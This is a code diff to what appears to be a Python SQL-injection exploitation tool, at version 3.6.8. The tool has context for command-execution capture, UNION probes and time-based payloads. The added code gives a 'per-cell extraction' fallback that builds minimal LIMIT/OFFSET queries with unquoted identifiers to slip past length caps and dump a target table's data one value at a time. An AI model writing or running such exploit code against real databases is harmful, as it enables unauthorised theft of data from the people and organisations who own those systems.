@@ -70,7 +70,7 @@ RCE_TABLE = "bf_rce"              # scratch table that captures command output
 UMARK = "bfUc"                   # UNION column-reflection probe
 ULEFT, URIGHT = "bfUL", "bfUR"   # markers wrapped around a UNION-extracted value
 
-VERSION = "3.6.7"
+VERSION = "3.6.8"
 _RED, _RESET = "\033[1;31m", "\033[0m"   # bold red
 _ART = r"""
  ____  _      _____ _   _ _____  ______ ____  _      _____
@@ -112,6 +112,10 @@ class Dbms:
         return "'" + s.replace("'", "''") + "'"
     def quote_ident(self, name):         # identifier (table/column)
         return '"' + name.replace('"', '""') + '"'
+    def ident_lean(self, name):
+        # bare identifier when it's plainly safe (lower-case word) — saves the 2 quote chars
+        # that can decide whether a read fits a length cap; full quoting for anything else.
+        return name if re.match(r"^[a-z_][a-z0-9_]*$", name) else self.quote_ident(name)
 
     # --- time-based payload fragments (return None if unsupported) ---
     def sleep_inline(self, cond, sleep): return None   # used after AND/OR
@@ -165,6 +169,11 @@ class Dbms:
         # every value of ONE column in a single (short) request - the result rides back in the
         # error, which isn't length-capped, so this fits caps the per-row concat can't.
         return f"SELECT string_agg(cast({self.quote_ident(c)} as text),',') FROM {self.quote_ident(t)}"
+    def q_cell(self, t, c, off):
+        # last-resort, smallest read: one column / one row. Lean identifiers + LIMIT/OFFSET keep
+        # it tiny so it survives caps the column-at-a-time query can't (one request per cell).
+        tail = f" OFFSET {off}" if off else ""
+        return f"SELECT {self.ident_lean(c)} FROM {self.ident_lean(t)} LIMIT 1{tail}"
 
 
 class Postgres(Dbms):
@@ -1145,6 +1154,18 @@ def dump_mode(target, det, a):
         coldata[c] = raw.split(",") if raw else []
         if not raw:
             truncated.append(c)
+    # if even the per-column query was too long, drop to per-cell: the smallest read there is,
+    # one value at a time (LIMIT 1 OFFSET n), stopping at the first empty row.
+    if not any(coldata.values()) and det.dbms.name in ("postgresql", "mysql"):
+        print("[*] per-column query still too long for the cap — per-cell extraction ...", flush=True)
+        rows = []
+        for off in range(a.max_rows):
+            cells = [read_scalar(target, det, a, det.dbms.q_cell(table, c, off)) or "" for c in cols]
+            if not any(cells):
+                break
+            rows.append(cells)
+        coldata = {c: [r[j] for r in rows] for j, c in enumerate(cols)}
+        truncated = []
     nrows = min(max((len(v) for v in coldata.values()), default=0), a.max_rows)
     print(f"\n=== DUMP: {table} ===")
     print(f"columns ({len(cols)}): {', '.join(cols)}")
